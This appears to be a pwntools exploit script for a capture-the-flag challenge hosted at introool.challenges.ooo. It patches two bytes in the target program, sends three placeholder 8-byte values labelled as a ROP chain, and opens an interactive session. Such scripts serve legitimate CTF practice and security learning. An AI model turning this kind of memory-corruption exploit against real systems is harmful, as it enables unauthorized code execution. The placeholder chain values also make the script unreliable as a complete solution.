from pwn import *

p = remote("introool.challenges.ooo", 4242)
#context.log_level = "debug"

#1. which? 2. how many?
p.sendlineafter("> ", "05")
p.sendlineafter("> ", "200")

#1st byte patch
p.sendlineafter(": ", "90")
p.sendlineafter(": ", "91")
#2nd byte patch
p.sendlineafter(": ", "91")
p.sendlineafter(": ", "91")

#send 24bytes(rop chain)
p.sendlineafter("> ", "deadbeefcafebebe")
p.sendlineafter("> ", "deadbeefcafebebe")
p.sendlineafter("> ", "deadbeefcafebebe")

p.sendlineafter("> ", "1")

binary = p.recvuntil("\n")
print(binary)

p.interactive()